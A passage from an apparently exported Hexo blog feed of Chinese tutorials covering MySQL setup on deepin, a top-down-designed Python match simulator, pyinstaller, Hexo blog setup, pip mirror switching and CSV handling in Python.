sL:maY*3y6)d)</p><h2 id="MySQL数据库配置"><a href="#MySQL数据库配置" class="headerlink" title="MySQL数据库配置"></a>MySQL数据库配置</h2><p>1.开启myslql服务</p><pre><code>sudo ./support-files/mysql.server start</code></pre><p>若显示：</p><pre><code>Staring MySQL.OK</code></pre><p>则基本完成</p><p>2.将mysql进程放入系统进程中</p><pre><code>sudo cp support-files/mysql.server /etc/init.d/mysqld</code></pre><p>3.重新启动mysql服务（这一步骤执行时可能会出错，可以不做）</p><pre><code>serverice mysqld restart</code></pre><p>4.在/usr/bin下建立指向mysql的软连接后使用随机密码登陆mysql数据库</p><pre><code>sudo ln -s /usr/local/mysql/bin/mysql /usr/binmysql -u root -p</code></pre><p>根据提示输入上面保存的随机密码</p><p>5.进入mysql操作界面，为root用户设置新密码</p><pre><code>alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;0515&#39;;</code></pre><p>其中0515是设置的新密码，MySQL的安装和配置到此就结束了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> deepin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>运用Python语言(一)-程序设计方法论01</title>
      <link href="2021/04/08/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%80)-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA01/"/>
      <url>2021/04/08/Python/%E8%BF%90%E7%94%A8Python%E8%AF%AD%E8%A8%80(%E4%B8%80)-%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E6%96%B9%E6%B3%95%E8%AE%BA01/</url>
      
        <content type="html"><![CDATA[<h2 id="计算思维"><a href="#计算思维" class="headerlink" title="计算思维"></a>计算思维</h2><p>（1）计算思维的本质是<strong>抽象（Abstraction）</strong>和<strong>自动化（Automation）</strong>。</p><p>（2）人类在认识世界、改造世界过程中表现出的思维特征：</p><ul><li>以实验和验证为特征的实证思维，以物理学科为代表</li><li>以推理和演绎为特征的逻辑思维，以数学学科为代表</li><li>以设计和构造为特征的计算思维，以计算机学科为代表</li></ul><p>（3）在程序设计范畴，计算思维主要反映在：</p><ul><li>理解问题的计算特性</li><li>将计算特性抽象为计算问题</li><li>通过程序设计语言实现问题的自动求解</li></ul><p><strong>扩展：</strong>ENIAC是世界上第一台通用计算机，于1946年诞生于美国宾夕法尼亚大学摩尔实验室。</p><h2 id="体育竞技分析"><a href="#体育竞技分析" class="headerlink" title="体育竞技分析"></a>体育竞技分析</h2><p>（1）<strong>模拟</strong>是用来解决现实世界问题的重要手段和技术</p><p>（2）模拟与仿真：</p><ul><li>模拟(simulation)是抽象原系统某些行为特征并用另一系统来表示这些特征的过程。常用于设计初期的模拟验证。</li><li>仿真(emulation)则更进一步，需要模仿系统真实能做的事情，接受同样的数据，获得同样的结果，只是实现的过程不同。一般用于处理兼容性问题或在资源有限的条件下实现系统原型。</li></ul><p>（3）问题的IPO描述如下：</p><ul><li>输入：两个球员（球员A和球员B）的能力概率，模拟比赛的场次</li><li>处理：模拟比赛过程</li><li>输出：球员A和球员B分别赢得球赛的概率</li></ul><h2 id="自顶向下和自底向上"><a href="#自顶向下和自底向上" class="headerlink" title="自顶向下和自底向上"></a>自顶向下和自底向上</h2><p>要点：程序设计需要采用<strong>自顶向下</strong>的<strong>设计方法</strong>，采用<strong>自底向上</strong>的<strong>执行方法</strong></p><p>自顶向下的设计方法，其基本思想是：</p><ul><li>以一个总问题开始，试图把它表达为很多小问题组成的解决方案</li><li>再用同样的技术依次攻破每个小问题，最终问题变得非常小，以至于可以很容易解决</li><li>最后只需把所有的碎片组合起来，就可以得到一个程序</li></ul><h3 id="自顶向下设计"><a href="#自顶向下设计" class="headerlink" title="自顶向下设计"></a>自顶向下设计</h3><h4 id="1-顶层设计"><a href="#1-顶层设计" class="headerlink" title="1.顶层设计"></a>1.顶层设计</h4><p>（1）以体育竞技分析为例，从问题的IPO描述开始，以下是一个基础设计的4个步骤：</p><ul><li>步骤1：打印程序的介绍性信息</li><li>步骤2：获得程序运行需要的参数，即probA、proB、n</li><li>步骤3：利用球员A和B的的能力值proA和proB，模拟n次比赛</li><li>步骤4：输出球员A和球员B获胜比赛的场次和概率</li></ul><p>以上的基础设计是从IPO描述获得，可以作为<strong>自顶向下的顶层设计</strong></p><p>（2）步骤1输出一些介绍信息，下面是该步骤的Python代码，<strong>顶层设计一般不给出具体代码，仅给出函数定义</strong>。</p><pre><code class="python">def main():    printIntro()      #pirntIntro()函数打印一些必要的说明</code></pre><p>（3）步骤2获得用户输入。<strong>通过函数将输入语句及输入格式等细节封装或隐藏，</strong>只需假设程序如果调用了getInputs()函数即可获取变量probA、probB和n的值。这个函数必须为主程序返回这些值。</p><pre><code class="python">def main():    printIntro()    probA, probB, n = getInputs()</code></pre><p>（4）步骤3需要使用probA、probB模拟n场比赛。可类似步骤2，设计一个simNGames()函数来模拟n场比赛，并返回结果。按要求，<strong>该函数需要模拟n场比赛，并给出球员A和球员B赢得比赛的结果。</strong></p><pre><code class="python">def main():    printIntro()    probA, probB, n = getInputs()    winsA, winsB = simNGames(n, probA, probB)</code></pre><p>（5）步骤4输出结果，仍然只规划功能和函数。</p><pre><code class="python">def main():    printIntro()    probA, probB, n = getInputs()    winsA, winsB = simNGames(n, probA, probB)    printSummary(winsA, winsB)</code></pre><p>（6）完成以上4个步骤后，程序<strong>框架</strong>已经清晰，但main()函数并没有做什么。原问题被划分为4个独立的函数：printIntro()、getInputs()、simNGames()和printSummary()。并且这些函数名称、输入参数和预期返回值都已确定。</p><p><img src="https://i.loli.net/2021/04/10/LESiWt7gCAjchs5.png" alt="image-20210410115248745"></p><h4 id="2-第n层设计"><a href="#2-第n层设计" class="headerlink" title="2.第n层设计"></a>2.第n层设计</h4><p>（1）经过顶层设计，main()函数成为体育竞技分析的顶层结构，该设计可表示为上图，其中每层按照从左至右的顺序执行。连接两个矩形之间的线表示上面函数对下面函数的调用关系。箭头表示函数之间的输入和输出。</p><p>（2）每层设计中，<strong>参数和返回值如何设计是重点</strong>。<strong>确定事件的重要特征而忽略其他细节过程称为抽象。</strong></p><p>（3）<strong>自顶向下设计的第二阶段是实现或进一步抽象第二层函数。</strong></p><p>（4）printIntro()函数应该输出一个程序介绍，这个功能的代码如下：</p><pre><code class="python">def printIntro():    print(&quot;这个程序模拟两个选手A和B的某种竞技比赛&quot;)    print(&quot;程序运行需要A和B的能力值(以0到1之间的小数表示)&quot;)</code></pre><p>（5）getInputs()函数根据提示得到3个需要返回主程序的值，代码如下：</p><pre><code class="python">def getInputs():    a = eval(input(&quot;请输入选手A的能力值（0-1）：&quot;))    b = eval(input(&quot;请输入选手B的能力值（0-1）：&quot;))    n = eval(input(&quot;模拟比赛的场次：&quot;))    return a, b, n</code></pre><p>（6）simNGames()函数是整个程序的核心，<strong>其基本思路是模拟n场比赛，并跟踪记录每个球员赢得了多少比赛。</strong>”模拟n场比赛“直观感受像一个<strong>计数循环</strong>，而跟踪记录获胜场次更像<strong>计数过程</strong>。代码如下：</p><pre><code class="python">def simNGames(n, probA, probB):    winsA, winsB = 0, 0    for i in range(n):        sorceA, sorceB = simOneGame(probA,probB)        if sorceA &gt; sorceB:            winsA += 1        else:            winsB += 1    return winsA, winsB</code></pre><p>（7）代码中设计了simOneGame()函数，用于模拟一场比赛，**这个函数需要知道每个球员的的能力值，返回两个球员的得分，该设计对整体设计的更新如下：</p><p><img src="https://i.loli.net/2021/04/10/786Y1FbcQviez3o.png" alt="image-20210410124832003"></p><p>（8）实现simOneGame()函数。</p><ul><li>根据比赛规则，两个球员要持续对攻直至比赛结束，可以采用无限循环直到比赛结束条件成立。</li><li>记录比赛得分，保留发球局标记。</li><li>通过随机数和概率，可以确定发球方是否赢得了比分(random()&lt;prob)</li><li>若球员A发球，则需要使用A的概率，接着根据发球的结果，更新是球员A等分还是将球权交给B。</li></ul><p>代码如下：</p><pre><code class="python">def simOneGame(probA, probB):    sorceA, sorceB = 0, 0    serving = &quot;A&quot;    while not gameOver(sorceA,sorceB):        if serving == &quot;A&quot;:            if random() &lt; probA:                sorceA += 1            else:                serving = &quot;B&quot;        else:            if random() &lt; probB:                sorceB += 1            else:                serving = &quot;A&quot;    return sorceA, sorceB</code></pre><p>（9）上述代码中进一步设计了gameOver()函数，用来表示一场比赛结束的条件（首先达到15分的球员赢得一场比赛）。更新的结构图如下：</p><p><img src="https://i.loli.net/2021/04/10/1Oo4GadYniS3P7V.png" alt="image-20210410130915968"></p><p>（10）实现gameOver()函数，首先达到15分的球员赢得一场比赛，代码如下：</p><pre><code class="python">def gameOver(a,b):    return a == 15 or b == 15</code></pre><p>（11）最后是printSummary()函数，代码如下：</p><pre><code class="python">def printSummary(winsA, winsB):    n = winsA + winsB    print(&quot;竞技分析开始，共模拟&#123;&#125;场比赛&quot;.format(n))    print(&quot;选手A获胜&#123;&#125;场比赛，占比&#123;:0.1%&#125;&quot;.format(winsA,winsA/n))    print(&quot;选手B火舌&#123;&#125;场比赛，占比&#123;:0.1%&#125;&quot;.format(winsB,winsB/n))</code></pre><p>（12）将上述所有代码连接在一起，则形成了一个完整的代码：</p><pre><code class="python">from random import randomdef printIntro():    print(&quot;这个程序模拟两个选手A和B的某种竞技比赛&quot;)    print(&quot;程序运行需要A和B的能力值(以0到1之间的小数表示)&quot;)def getInputs():    a = eval(input(&quot;请输入选手A的能力值（0-1）：&quot;))    b = eval(input(&quot;请输入选手B的能力值（0-1）：&quot;))    n = eval(input(&quot;模拟比赛的场次：&quot;))    return a, b, ndef simNGames(n, probA, probB):    winsA, winsB = 0, 0    for i in range(n):        sorceA, sorceB = simOneGame(probA,probB)        if sorceA &gt; sorceB:            winsA += 1        else:            winsB += 1    return winsA, winsBdef simOneGame(probA, probB):    sorceA, sorceB = 0, 0    serving = &quot;A&quot;    while not gameOver(sorceA,sorceB):        if serving == &quot;A&quot;:            if random() &lt; probA:                sorceA += 1            else:                serving = &quot;B&quot;        else:            if random() &lt; probB:                sorceB += 1            else:                serving = &quot;A&quot;    return sorceA, sorceBdef gameOver(a,b):    return a == 15 or b == 15def printSummary(winsA, winsB):    n = winsA + winsB    print(&quot;竞技分析开始，共模拟&#123;&#125;场比赛&quot;.format(n))    print(&quot;选手A获胜&#123;&#125;场比赛，占比&#123;:0.1%&#125;&quot;.format(winsA,winsA/n))    print(&quot;选手B火舌&#123;&#125;场比赛，占比&#123;:0.1%&#125;&quot;.format(winsB,winsB/n))def main():    printIntro()    probA, probB, n = getInputs()    winsA, winsB = simNGames(n, probA, probB)    printSummary(winsA, winsB)main()</code></pre><p>该程序运行结果如下：</p><pre><code class="python">&gt;&gt;&gt;这个程序模拟两个选手A和B的某种竞技比赛程序运行需要A和B的能力值(以0到1之间的小数表示)请输入选手A的能力值（0-1）：0.45请输入选手B的能力值（0-1）：0.5模拟比赛的场次：1000竞技分析开始，共模拟1000场比赛选手A获胜369场比赛，占比36.9%选手B火舌631场比赛，占比63.1%</code></pre><h4 id="3-设计过程总结"><a href="#3-设计过程总结" class="headerlink" title="3.设计过程总结"></a>3.设计过程总结</h4><p>自顶向下的设计过程从问题的输入输出开始，整体设计逐渐向下进行。<strong>每一层以大体算法描述开始，然后逐步细化成代码</strong>，细节被函数封装。该设计方法通过封装实现抽象，利用了<strong>模块化设计</strong>的思想。整个过程可以概括为以下4个步骤：</p><ul><li>步骤1：将算法表达为一系列小问题。</li><li>步骤2：为每个小问题设计接口。</li><li>步骤3：通过将算法表达为接口关联的多个小问题来细化算法。</li><li>步骤4：为每个小问题重复上述过程。</li></ul><h3 id="自底向上执行"><a href="#自底向上执行" class="headerlink" title="自底向上执行"></a>自底向上执行</h3><p>（1）程序编写后，需要经过测试。</p><ul><li>小规模程序，直接运行即可</li><li>大规模程序，则是将程序分成小部分逐个测试。</li></ul><p>（2）执行中等规模程序的最好方法是从结构图的最底层开始，而不是从顶部开始，然后逐步上升。或者说，<strong>先运行和测试每一个基本函数，再测试由基础函数组成的整体函数，这样有助于定位错误</strong>。以体育竞技分析为例，可以从gameOver()函数开始测试。</p><p>（3）Python解释器提供import保留字辅助开展单元测试，语法格式如下：</p><pre><code class="python">import &lt;源文件名称&gt;  #这里注意，import要求源文件名称中不能出现英文句号.</code></pre><p>（4）在源文件的路径下打开cmd，运行python环境，对gameOver()函数进行单元测试如下：</p><pre><code class="python">&gt;&gt;&gt; import matchAnalysis这个程序模拟两个选手A和B的某种竞技比赛程序运行需要A和B的能力值(以0到1之间的小数表示)请输入选手A的能力值（0-1）：0.45请输入选手B的能力值（0-1）：0.5模拟比赛的场次：1000竞技分析开始，共模拟1000场比赛选手A获胜374场比赛，占比37.4%选手B火舌626场比赛，占比62.6%&gt;&gt;&gt; matchAnalysis.gameOver(15,10)True&gt;&gt;&gt; matchAnalysis.gameOver(10,1)False</code></pre><p>（5）根据gameOver的测试结果，说明gameOver()函数是正确的。可以进一步测试simOneGame()函数，代码如下：</p><pre><code class="python">&gt;&gt;&gt; matchAnalysis.simOneGame(0.45,0.5)(10, 15)&gt;&gt;&gt; matchAnalysis.simOneGame(0.45,0.5)(9, 15)</code></pre><p>（6）通过这样的<strong>单元测试</strong>可以检测程序中的每个函数，<strong>独立检验</strong>每个函数更容易发现错误。</p><h2 id="pyinstaller库的使用"><a href="#pyinstaller库的使用" class="headerlink" title="pyinstaller库的使用"></a>pyinstaller库的使用</h2><h3 id="pyinstaller概述"><a href="#pyinstaller概述" class="headerlink" title="pyinstaller概述"></a>pyinstaller概述</h3><p>（1）pyinstaller是一个将Python语言脚本(.py文件)打包成可执行文件的第三方库，它能够在Windows、Linux、Mac OS X等操作系统下将Python源文件打包，<strong>通过对源文件打包，Python程序可以在没有安装Python的环境下运行，</strong>也可以作为一个独立文件方便传递和管理。</p><p>（2）pyinstaller需要再命令行下用pip工具安装，代码如下：</p><pre><code>pip3 install pyinstaller</code></pre><p>（3）pyinstaller的官方网站网址为<a href="http://www.pyinstaller.org/">http://www.pyinstaller.org</a></p><p>（4）pyinstaller库会自动将pyinstaller命令安装到Python解释器目录中，与pip3命令路径相同，因此可以<strong>直接使用。</strong>在<strong>Windows平台的命令行</strong>中输入Python源文件名称，可以使用相对路径或绝对路径，代码如下：</p><pre><code>pyinstaller hello.py  //pyinstaller不支持源文件名中有英文句号(.)存在或pyinstaller D:\Python\program\第一章\hello.py</code></pre><p>（5）执行完毕后，<strong>源文件所在目录将生成dist和build两个文件夹。</strong>其中，</p><ul><li>build目录是pyinstaller存储临时文件的目录，可以安全删除。</li><li><strong>最终打包程序在dist内部的dpython中。</strong>目录中的其他文件是可执行文件hello.exe的动态链接库。</li></ul><p>（6）<strong>可以通过-F参数对Python源文件生成一个独立的可执行文件</strong>，代码如下：</p><pre><code>pyinstaller -F hello.py</code></pre><p>（7）执行后<strong>在dist目录中出现了hello.exe文件，没有任何依赖库，执行它即可。</strong></p><p>（8）使用pyinstaller库需要注意以下问题：</p><ul><li>文件路径中不能出现空格和英文句号(.)</li><li>源文件必须是UTF-8编码，暂不支持其他编码类型。采用idle编写的源文件都保存为UTF-8编码形式，可直接使用。</li></ul><h4 id="扩展：动态链接"><a href="#扩展：动态链接" class="headerlink" title="扩展：动态链接"></a>扩展：<strong>动态链接</strong></h4><p>（1）动态链接提供了一种方法，能够使进程在运行时实际调用不属于其程序的代码。</p><p>（2）如果其他代码由操作系统提供，则应用程序由于不包含这些代码而变得十分精简。</p><p>（3）Windows平台提供大量的动态链接库，一般使用dll或ocx为扩展名。</p><p>（4）静态链接与动态链接相对，指程序中自包含其所调用的所有代码，这使得程序可以在系统间移动而无需考虑库函数是否一致。</p><h3 id="pyinstaller解析"><a href="#pyinstaller解析" class="headerlink" title="pyinstaller解析"></a>pyinstaller解析</h3><p>（1）pyinstaller的常用参数。</p><table><thead><tr><th align="center">参数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">-h, –help</td><td align="center">查看帮助</td></tr><tr><td align="center">-v, –version</td><td align="center">查看pyinstaller版本</td></tr><tr><td align="center">–clean</td><td align="center">清理打包过程中的临时文件</td></tr><tr><td align="center">-D, –onedir</td><td align="center">默认值，生产dist目录</td></tr><tr><td align="center">-F, –onefile</td><td align="center">在dist文件夹中只生成独立的打包文件</td></tr><tr><td align="center">-p DIR, –paths DIR</td><td align="center">添加python文件使用的第三方库路径</td></tr><tr><td align="center">-i &lt;.ico or .exe,ID or .icns&gt;,   -icon &lt;.ico or .exe,ID or .icns&gt;</td><td align="center">指定打包程序使用的图标(icon)文件</td></tr></tbody></table><p>（2）pyinstaller命令不需要在Python源文件中增加代码，只需通过命令行进行打包即可。</p><p>（3）-F 参数最为常用，对于包含第三方库的源文件，可以使用-p添加第三方库所在路径。若第三方库由pip安装且在Python环境目录中，则不需要使用-p参数。</p><p>（4）在生成的打包文件下执行代码</p><pre><code>PS D:\Python\program\第一章\dist&gt; ./hello.exeHello World</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>deepin下搭建hexo博客</title>
      <link href="2021/04/06/deepin/deepin%E4%B8%8B%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/"/>
      <url>2021/04/06/deepin/deepin%E4%B8%8B%E6%90%AD%E5%BB%BAhexo%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>（1）安装git</p><pre><code>sudo apt install git</code></pre><p>（2）安装npm</p><pre><code>sudo apt install npm</code></pre><p>（3）配置ssh key</p><pre><code>git config --global user.name &quot;username&quot;   //username是你的GitHub用户名git config --global user.email &quot;XXXX@XX.com&quot;  //XXXX@XX.com 填你注册GitHub的邮箱ssh-keygen -t rsa -C &quot;XXXX@eXX.com&quot; //XXXX@XX.com 填你注册GitHub的邮箱，该步骤按3下回车初始化sshkey</code></pre><p>最终会成生成一个文件在用户目录下(/home/username/.ssh)，找到id_rsa.pub文件，复制文件的内容。接着登陆github，依次点击：头像–&gt;Settings–&gt;SSH and GPG kyes –&gt;New SSH key将ssh key粘贴到github上，title可随意命名。</p><pre><code>ssh -T git@github.com      //测试是否成功，注意邮箱地址不用改  /*如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：Hi liuxianan! You&#39;ve successfully authenticated, but GitHub does not provide shell access.*/</code></pre><p>（4）将npm换为国内源，使用阿里定制的cnpm命令行工具代替默认的npm</p><pre><code>sudo npm install -g cnpm --registry=https://registry.npm.taobao.org</code></pre><p>（5）安装hexo</p><pre><code>sudo cnpm install -g hexo</code></pre><p>（6）在电脑中新建一个hexo文件夹，在该文件夹下打开终端，初始化hexo</p><pre><code>hexo init     //该命令执行完后会自动下载一些文件到当前路径下</code></pre><p>接着把Windows中的hexo目录下的文件，从scaffolds开始的所有文件复制并替换到Linux下hexo目录下。</p><pre><code>hexo g //生成静态页面hexo s //启动服务</code></pre><p>（7）安装插件</p><pre><code>sudo cnpm install hexo-deployer-git --save  </code></pre><p>安装完插件后就可以使用如下命令提交改动的代码</p><pre><code>hexo d</code></pre><p>扩展：在Deepin 15.9.3系统中将/etc/NetworkManager/NetworkManager.conf文件中的下面两行前面加上#注释掉，即：</p><p>#[connectivity]</p><p>#uri=<a href="http://packages.deepin.com/misc/check_network_status.txt">http://packages.deepin.com/misc/check_network_status.txt</a></p><p>然后保存修改的NetworkManager.conf文件。</p><p>2、在系统终端中重新启动网络</p><p>运行以下命令：</p><p>systemctl restart network-manager</p><p>做完以上两步，通常情况下屏幕就可以调节色温了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> deepin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux下进行Python3的pip换源操作</title>
      <link href="2021/04/05/Python/Linux%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/"/>
      <url>2021/04/05/Python/Linux%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>1）sudo apt install python3-pip</p><p>（2）python3 -V #查看Python3的版本</p><p>（3）pip3 -V #查看pip3的版本</p><p>（4）sudo python3 -m pip install –upgrade pip #升级pip版本，pip3版本大于10可忽略此步骤</p><ul><li>若该命令执行失败，可以在resolv配置文件中增加nameserevr后再次执行。</li></ul><pre><code>sudo vim /etc/resolv.confnameserver 8.8.8.8</code></pre><p>（5）pip3 config set global.index-url 源链接 #若pip3版本大于10，则可使用这条命令进行换源，无需进行其它新建文件操作</p><p>（6）pip3 install 库名称 #换源成功后下载第三方库</p><p>（7）国内源地址</p><pre><code>清华大学 https://pypi.tuna.tsinghua.edu.cn/simple/ 阿里云 http://mirrors.aliyun.com/pypi/simple/ 中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/ 豆瓣(douban) http://pypi.douban.com/simple/ 中国科学技术大学 http://pypi.mirrors.ustc.edu.cn/simple/</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>deepin下进行Python3的pip换源操作</title>
      <link href="2021/04/05/deepin/deepin%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/"/>
      <url>2021/04/05/deepin/deepin%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<p>1）sudo apt install python3-pip</p><p>（2）python3 -V #查看Python3的版本</p><p>（3）pip3 -V #查看pip3的版本</p><p>（4）sudo python3 -m pip install –upgrade pip #升级pip版本，pip3版本大于10可忽略此步骤</p><ul><li>若该命令执行失败，可以在resolv配置文件中增加nameserevr后再次执行。</li></ul><pre><code>sudo vim /etc/resolv.confnameserver 8.8.8.8</code></pre><p>（5）pip3 config set global.index-url 源链接 #若pip3版本大于10，则可使用这条命令进行换源，无需进行其它新建文件操作</p><p>（6）pip3 install 库名称 #换源成功后下载第三方库</p><p>（7）国内源地址</p><pre><code>清华大学 https：//pypi.tuna.tsinghua.edu.cn/simple/ 阿里云 http：//mirrors.aliyun.com/pypi/simple/ 中国科技大学 https：//pypi.mirrors.ustc.edu.cn/simple/ 豆瓣(douban) http：//pypi.douban.com/simple/ 中国科学技术大学 http：//pypi.mirrors.ustc.edu.cn/simple/</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> deepin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入Python语言(十)-文件和数据格式化02</title>
      <link href="2021/04/05/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%8D%81)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9602/"/>
      <url>2021/04/05/Python/%E6%B7%B1%E5%85%A5Python%E8%AF%AD%E8%A8%80(%E5%8D%81)-%E6%96%87%E4%BB%B6%E5%92%8C%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E5%8C%9602/</url>
      
        <content type="html"><![CDATA[<h2 id="一二维数据的格式化和处理"><a href="#一二维数据的格式化和处理" class="headerlink" title="一二维数据的格式化和处理"></a>一二维数据的格式化和处理</h2><p><strong>数据组织存在维度，列表类型用于表示和处理一维和二维数据</strong></p><h3 id="数据组织的维度"><a href="#数据组织的维度" class="headerlink" title="数据组织的维度"></a>数据组织的维度</h3><p>（1）一维数据由对等关系的有序或无序数据构成，采用线性方式组织，对应于数学中的数组和集合等概念。</p><p>（2）二维数据，也称为表格数据，由关联关系数据构成，采用表格方式组织，对应于数学中的矩阵，常见的表格都属于二维数据。</p><p>（3）高维数据由键值对类型的数据构成，采用对象方式组织，属于整合度更好的数据组织方式。HTML、XML、JSON等都是高维数据组织的语法结构。</p><p>（4）数据包括文件存储和程序使用两个状态。存储不同维度的数据需要适合维度特点的文件存储格式，处理不同维度数据的程序需要使用相适应的数据类型或结构。<strong>对于数据处理，需要考虑存储格式以及表示和读写等两个问题。</strong></p><h3 id="一二维数据的存储格式"><a href="#一二维数据的存储格式" class="headerlink" title="一二维数据的存储格式"></a>一二维数据的存储格式</h3><p>（1）一维数据是最简单的数据组织类型，有多种存储格式，常用特殊字符分隔，分隔方式如下：</p><ul><li>用一个或多个空格分隔，例如：</li></ul><pre><code>中国  美国  日本  德国  法国  英国  意大利</code></pre><ul><li>用逗号分隔，注意是半角符号</li></ul><pre><code>中国, 美国, 日本, 德国, 法国, 英国, 意大利</code></pre><ul><li>用其他符号或符号组合分隔</li></ul><pre><code>中国; 美国; 日本; 德国; 法国; 英国; 意大利</code></pre><p>（2）二维数据由多条一维数据构成，可以看成是一维数据的组合形式。<strong>一种国际通用的一二维数据存储格式：CSV格式。</strong></p><p>（3）逗号分隔数值的存储格式叫做CSV格式，常应用在程序之间转移表格数据，该格式的一些基本规则如下：</p><ul><li><p>纯文本格式，通过单一编码表示字符</p></li><li><p>以行为单位，开头不留空行，行之间没有空行</p></li><li><p>每行表示一个一维数据，多行表示二维数据</p></li><li><p>以逗号(半角符号)分隔每列数据，列数据为空也要保留逗号</p></li><li><p>对于表格数据，可以包含或不包含表格数据，包含时<strong>列名放置在文件第一行</strong></p><p>例如，二维数据采用CSV存储后的内容如下：</p></li></ul><pre><code>城市,环比,同比,定基          #列名北京,101.5,120.7,121.4上海,101.2,127.3,127.8广州,101.3,119.4,120深圳,102,140.9,145.5</code></pre><p>（4）CSV格式存储的文件一般采用.csv为扩展名，可以通过Windows上的记事本或Excel工具打开，也可以在其他操作系统平台上用文本编辑器打开。</p><p>（5）一般的表格数据处理工具(例如Excel)都可以将数据另存为或导出为CSV格式，用于不同工具间进行数据交换。</p><p>扩展：<strong>Python的csv标准库</strong></p><p>Python提供了一个读写csv的标准库，可以通过import csv使用。csv库包含操作CSV格式最基本的功能，csv.reader()和csv.writer()。csv标准库一般应用于运行在复杂环境或商业使用的程序。</p><h3 id="一二维数据的表示和读写"><a href="#一二维数据的表示和读写" class="headerlink" title="一二维数据的表示和读写"></a>一二维数据的表示和读写</h3><p>（1）CSV文件的每一行是一维数据，可以使用列表类型表示。整个CSV文件是一个二维数据，由表示每一行的列表类型作为元素，组成一个<strong>二维列表</strong>。表示如下：</p><pre><code>[    [&#39;城市&#39;, &#39;环比&#39;, &#39;同比&#39;, &#39;定基\n&#39;],    [&#39;北京&#39;, &#39;101.5&#39;, &#39;120.7&#39;, &#39;121.4\n&#39;],    [&#39;上海&#39;, &#39;101.2&#39;, &#39;127.3&#39;, &#39;127.8\n&#39;],    [&#39;广州&#39;, &#39;101.3&#39;, &#39;119.4&#39;, &#39;120.0\n&#39;],    [&#39;深圳&#39;, &#39;102.0&#39;, &#39;140.9&#39;, &#39;145.5\n&#39;],]</code></pre><p>（2）导入CSV格式数据到列表。首先要一个表格，将数据录入，然后保存成price2021.csv文件。</p><p><img src="https://i.loli.net/2021/04/01/yGYlsv9O2uoWEwi.png" alt="image-20210401183648081"></p><pre><code class="python">fo = open(&quot;price2021.csv&quot;,&quot;r&quot;)ls = []for line in fo:    line = line.replace(&quot;\n&quot;,&quot;&quot;)      #将多余的换行符用字符串的replace()方法去掉    ls.append(line.split(&quot;,&quot;))print(ls)fo.close()#运行结果[[&#39;城市&#39;, &#39;环比&#39;, &#39;同比&#39;, &#39;定基&#39;], [&#39;北京&#39;, &#39;101.5&#39;, &#39;120.7&#39;, &#39;121.4&#39;], [&#39;上海&#39;, &#39;101.2&#39;, &#39;127.3&#39;, &#39;127.8&#39;], [&#39;广州&#39;, &#39;101.3&#39;, &#39;119.4&#39;, &#39;120&#39;], [&#39;深圳&#39;, &#39;102&#39;, &#39;140.9&#39;, &#39;145.5&#39;], [&#39;沈阳&#39;, &#39;100.1&#39;, &#39;101.4&#39;, &#39;101.6&#39;]]</code></pre><p>（3）逐行处理CSV格式数据：从CSV文件中读取数据，去掉内容中的逗号，打印到屏幕。使用price2021.csv文件。</p><pre><code class="python">fo = open(&quot;price2021.csv&quot;, &quot;r&quot;)ls = []for line in fo:    line = line.replace(&quot;\n&quot;,&quot;&quot;)    ls = line.split(&quot;,&quot;)    lns = &quot;&quot;    for s in ls:        lns += &quot;&#123;&#125;\t&quot;.format(s)    print(lns)fo.close()#运行结果：城市    环比    同比    定基北京    101.5   120.7   121.4上海    101.2   127.3   127.8广州    101.3   119.4   120深圳    102     140.9   145.5沈阳    100.1   101.4   101.6</code></pre><p>（4）对于Python列表变量保存一维数据结果，可以用字符串的join()方法组成逗号分隔形式再通过文件的write()方法存储到CSV文件中。</p><ul><li>一维数据写入CSV文件</li></ul><pre><code class="python">fo = open(&quot;price2021bj.csv&quot;, &quot;w&quot;)ls = [&#39;北京&#39;, &#39;101.5&#39;, &#39;120.7&#39;, &#39;121.4&#39;] #要写入的一维数据fo.write(&quot;,&quot;.join(ls)+ &quot;\n&quot;)  #其中&quot;,&quot;.join(ls)生成一个新的字符串，它由字符串&quot;,&quot;分隔列表ls中的元素组成fo.close()#运行结果北京,101.5,120.7,121.4</code></pre><p>（5）对于列表中存储的二维数据，可以通过循环写入一维数据的方式写入CSV文件，代码样式如下：</p><pre><code class="python">for row in ls:    